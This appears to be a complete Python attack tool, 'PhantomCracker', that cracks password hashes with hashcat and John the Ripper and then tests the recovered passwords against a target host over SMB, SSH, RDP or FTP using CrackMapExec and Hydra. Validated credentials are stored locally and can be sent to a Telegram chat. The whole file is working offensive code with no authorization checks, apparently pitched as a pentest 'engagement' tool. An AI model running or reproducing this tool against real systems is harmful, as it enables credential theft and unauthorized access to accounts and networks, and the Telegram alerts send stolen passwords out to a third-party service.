#!/usr/bin/env python3
"""
PhantomCracker v1.0 — Unified Password Cracking + Validation Platform
Combines: hashcat (GPU) + John (detection) + CME (validation) + Hydra (online)
"""

import os
import sys
import json
import time
import sqlite3
import argparse
import datetime
import subprocess
import threading
import urllib.request
from pathlib import Path

# ============================================================
# CONFIGURATION
# ============================================================

HOME = Path.home() / ".phantomcracker"
HOME.mkdir(exist_ok=True)

DB_PATH = HOME / "phantom.db"
POTFILE = HOME / "phantom.pot"
WORDLIST = "/usr/share/wordlists/rockyou.txt"
RULES = "/usr/share/hashcat/rules/best64.rule"
TELEGRAM_TOKEN = ""  # Optional: set for real-time alerts
TELEGRAM_CHAT_ID = ""

# ============================================================
# DATABASE
# ============================================================

def init_db():
    conn = sqlite3.connect(str(DB_PATH))
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS cracked (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        hash TEXT UNIQUE,
        password TEXT,
        crack_type TEXT,
        cracked_at TEXT
    )""")
    c.execute("""CREATE TABLE IF NOT EXISTS validated (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT,
        password TEXT,
        target TEXT,
        service TEXT,
        validated_at TEXT
    )""")
    conn.commit()
    conn.close()

def save_cracked(hash_val, password, crack_type):
    conn = sqlite3.connect(str(DB_PATH))
    c = conn.cursor()
    c.execute("INSERT OR IGNORE INTO cracked (hash, password, crack_type, cracked_at) VALUES (?, ?, ?, ?)",
              (hash_val, password, crack_type, datetime.datetime.now().isoformat()))
    conn.commit()
    conn.close()

def save_validated(username, password, target, service):
    conn = sqlite3.connect(str(DB_PATH))
    c = conn.cursor()
    c.execute("INSERT INTO validated (username, password, target, service, validated_at) VALUES (?, ?, ?, ?, ?)",
              (username, password, target, service, datetime.datetime.now().isoformat()))
    conn.commit()
    conn.close()

# ============================================================
# TELEGRAM NOTIFICATIONS
# ============================================================

def send_alert(message):
    if not TELEGRAM_TOKEN or not TELEGRAM_CHAT_ID:
        return
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        data = json.dumps({"chat_id": TELEGRAM_CHAT_ID, "text": message}).encode()
        req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/json"})
        urllib.request.urlopen(req, timeout=5)
    except:
        pass

# ============================================================
# HASH DETECTION (John the Ripper)
# ============================================================

def detect_hash_type(hash_file):
    """Use John to auto-detect hash type."""
    print("[*] Auto-detecting hash type with John...")
    
    # Check if it's a known format first
    with open(hash_file, 'r') as f:
        sample = f.read().strip()[:200]
    
    # Quick format detection
    if sample.startswith('$2y$') or sample.startswith('$2a$') or sample.startswith('$2b$'):
        return 3200, "bcrypt"
    elif sample.startswith('$6$'):
        return 1800, "SHA-512 crypt"
    elif sample.startswith('$5$'):
        return 7400, "SHA-256 crypt"
    elif sample.startswith('$1$'):
        return 500, "MD5 crypt"
    elif ':' in sample and len(sample.split(':')[0]) == 32 and len(sample.split(':')) >= 3:
        return 1000, "NTLM"
    elif len(sample) == 32 and all(c in '0123456789abcdef' for c in sample.lower()):
        return 0, "MD5"
    elif len(sample) == 40 and all(c in '0123456789abcdef' for c in sample.lower()):
        return 100, "SHA1"
    elif len(sample) == 64 and all(c in '0123456789abcdef' for c in sample.lower()):
        return 1400, "SHA256"
    elif sample.startswith('$krb5tgs$'):
        return 13100, "Kerberos TGS"
    elif sample.startswith('$krb5asrep$'):
        return 18200, "Kerberos AS-REP"
    
    # Fallback: use John to detect
    result = subprocess.run(
        ["john", "--list=formats"],
        capture_output=True, text=True, timeout=10
    )
    
    # Try John's auto-detect
    result = subprocess.run(
        ["john", hash_file, "--wordlist=" + WORDLIST, "--max-run-time=5"],
        capture_output=True, text=True, timeout=30
    )
    
    for line in result.stdout.split('\n'):
        if 'Loaded' in line and 'hash' in line:
            print(f"[+] John detected: {line.strip()}")
            # Try common formats
            for fname, fmode in [("nt", 1000), ("raw-md5", 0), ("raw-sha1", 100), 
                                  ("raw-sha256", 1400), ("sha512crypt", 1800),
                                  ("bcrypt", 3200), ("md5crypt", 500)]:
                if fname in line.lower():
                    return fmode, line.strip()
            break
    
    print("[!] Could not auto-detect. Enter hashcat mode number:")
    mode = input("  hashcat -m ")
    return int(mode), "manual"

# ============================================================
# CRACKING WITH HASHCAT
# ============================================================

def crack_with_hashcat(hash_file, hash_mode, attack_type="dictionary"):
    """Run hashcat with progressively harder attacks."""
    
    cmd = [
        "hashcat",
        "-m", str(hash_mode),
        "-a", "0" if attack_type == "dictionary" else "3",
        "-O", "--force",
        "--potfile-path", str(POTFILE),
        "-w", "3",
        "--status",
        "--status-timer", "10",
        hash_file
    ]
    
    if attack_type == "dictionary":
        cmd.append(WORDLIST)
        cmd.extend(["-r", RULES])
        print(f"\n[*] Starting dictionary + rules attack (hashcat -m {hash_mode})")
    elif attack_type == "mask":
        cmd.append("?l?l?l?l?l?l?l?d?d")  # 8 lowercase + 2 digits
        print(f"\n[*] Starting mask attack (8 lowercase + 2 digits)")
    
    print(f"[*] Command: {' '.join(cmd)}")
    print("[*] Press Ctrl+C to stop (progress is saved)")
    
    process = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        universal_newlines=True
    )
    
    cracked_count = 0
    for line in process.stdout:
        line = line.strip()
        if 'Cracked' in line:
            try:
                count = int([x for x in line.split() if x.isdigit()][0])
                if count > cracked_count:
                    cracked_count = count
                    print(f"  [+] Cracked so far: {count}")
            except:
                pass
        if 'Speed' in line and 'H/s' in line:
            print(f"  [Speed] {line.strip()}")
        if 'Progress' in line:
            print(f"  [Progress] {line.strip()}")
    
    process.wait()
    
    # Extract cracked passwords
    result = subprocess.run(
        ["hashcat", "-m", str(hash_mode), "--show", hash_file, "--potfile-path", str(POTFILE)],
        capture_output=True, text=True
    )
    
    cracked = []
    for line in result.stdout.strip().split('\n'):
        if ':' in line:
            parts = line.split(':', 1)
            if len(parts) == 2:
                hash_val, password = parts
                cracked.append((hash_val, password))
                save_cracked(hash_val, password, attack_type)
    
    return cracked

# ============================================================
# VALIDATION WITH CrackMapExec
# ============================================================

def validate_with_cme(target, username, password):
    """Test a single credential against SMB."""
    print(f"  [*] Testing {username}:{password} against {target} (SMB)...")
    
    result = subprocess.run(
        ["crackmapexec", "smb", target, "-u", username, "-p", password],
        capture_output=True, text=True, timeout=30
    )
    
    if '[+]' in result.stdout:
        print(f"    [SUCCESS] {username}:{password} works on {target}")
        save_validated(username, password, target, "SMB")
        send_alert(f"VALIDATED: {username}:{password} on {target} (SMB)")
        return True
    
    return False

def validate_with_hydra(target, username, password, service="ssh"):
    """Test a single credential against SSH/RDP/FTP."""
    print(f"  [*] Testing {username}:{password} against {target} ({service})...")
    
    result = subprocess.run(
        ["hydra", "-l", username, "-p", password, "-t", "1", "-w", "3",
         f"{service}://{target}"],
        capture_output=True, text=True, timeout=30
    )
    
    if '[+]' in result.stdout or 'success' in result.stdout.lower():
        print(f"    [SUCCESS] {username}:{password} works on {target} ({service})")
        save_validated(username, password, target, service.upper())
        send_alert(f"VALIDATED: {username}:{password} on {target} ({service.upper()})")
        return True
    
    return False

# ============================================================
# FULL WORKFLOW
# ============================================================

def run_full_engagement(hash_file, target_ip=None, services=None):
    """Complete workflow: detect → crack → validate."""
    
    # Step 1: Init
    init_db()
    print("=" * 60)
    print("  PhantomCracker v1.0 — Full Engagement")
    print("=" * 60)
    
    # Step 2: Detect hash type
    hash_mode, hash_name = detect_hash_type(hash_file)
    print(f"[+] Detected: {hash_name} (hashcat mode {hash_mode})")
    
    # Step 3: Dictionary attack
    cracked = crack_with_hashcat(hash_file, hash_mode, "dictionary")
    
    # Step 4: If dictionary didn't crack everything, try mask
    if len(cracked) == 0:
        print("\n[!] Dictionary + rules found nothing. Trying mask attack...")
        cracked = crack_with_hashcat(hash_file, hash_mode, "mask")
    
    # Step 5: Show results
    print("\n" + "=" * 60)
    print(f"  CRACKED PASSWORDS: {len(cracked)}")
    print("=" * 60)
    for h, p in cracked:
        print(f"  {h}: {p}")
    
    # Step 6: If target IP provided, validate cracked creds
    if target_ip and len(cracked) > 0:
        print("\n" + "=" * 60)
        print("  VALIDATING CRACKED CREDENTIALS")
        print("=" * 60)
        
        services = services or ["smb"]
        
        for hash_val, password in cracked:
            # Try to extract username from hash file
            username = "administrator"  # Default
            
            # Check if hash file has usernames (user:hash format)
            with open(hash_file, 'r') as f:
                for line in f:
                    if hash_val in line and ':' in line:
                        parts = line.split(':')
                        if parts[0] != hash_val and len(parts[0]) > 0:
                            username = parts[0]
                        break
            
            for service in services:
                if service == "smb":
                    validate_with_cme(target_ip, username, password)
                elif service in ["ssh", "rdp", "ftp"]:
                    validate_with_hydra(target_ip, username, password, service)
    
    # Step 7: Summary
    print("\n" + "=" * 60)
    print("  SESSION SUMMARY")
    print("=" * 60)
    print(f"  Hashes cracked: {len(cracked)}")
    
    conn = sqlite3.connect(str(DB_PATH))
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM validated")
    validated_count = c.fetchone()[0]
    c.execute("SELECT * FROM validated")
    for row in c.fetchall():
        print(f"  [+] {row[0]}:{row[1]} -> {row[2]} ({row[3]})")
    conn.close()
    
    print(f"\n  Validated credentials: {validated_count}")
    print(f"\n  Database: {DB_PATH}")
    print(f"  Potfile: {POTFILE}")

# ============================================================
# COMMAND LINE
# ============================================================

def main():
    parser = argparse.ArgumentParser(description="PhantomCracker — Unified Password Cracking & Validation")
    parser.add_argument("hash_file", help="File containing password hashes")
    parser.add_argument("-m", "--mode", type=int, help="Hashcat mode (auto-detect if omitted)")
    parser.add_argument("-t", "--target", help="Target IP to validate cracked passwords against")
    parser.add_argument("-s", "--services", nargs="+", default=["smb"], 
                        help="Services to test: smb, ssh, rdp, ftp (default: smb)")
    parser.add_argument("--dictionary-only", action="store_true", help="Skip mask attack")
    parser.add_argument("--no-validate", action="store_true", help="Skip validation step")
    
    args = parser.parse_args()
    
    if not os.path.exists(args.hash_file):
        print(f"[!] File not found: {args.hash_file}")
        sys.exit(1)
    
    if args.mode and args.no_validate:
        # Quick crack with known mode
        init_db()
        print(f"[*] Cracking mode {args.mode} with dictionary + rules...")
        cracked = crack_with_hashcat(args.hash_file, args.mode, "dictionary")
        
        if not args.dictionary_only and len(cracked) == 0:
            print("[!] Nothing cracked. Trying mask attack...")
            cracked = crack_with_hashcat(args.hash_file, args.mode, "mask")
        
        print(f"\n[+] Cracked {len(cracked)} hashes:")
        for h, p in cracked:
            print(f"  {h}: {p}")
        
    elif args.mode and args.target:
        # Full: crack then validate
        init_db()
        print(f"[*] Cracking mode {args.mode} + validating against {args.target}...")
        cracked = crack_with_hashcat(args.hash_file, args.mode, "dictionary")
        
        if not args.dictionary_only and len(cracked) == 0:
            cracked = crack_with_hashcat(args.hash_file, args.mode, "mask")
        
        for h, p in cracked:
            username = "administrator"
            for service in args.services:
                if service == "smb":
                    validate_with_cme(args.target, username, p)
                else:
                    validate_with_hydra(args.target, username, p, service)
    
    else:
        # Full automatic mode
        run_full_engagement(args.hash_file, args.target, args.services)

if __name__ == "__main__":
    main()
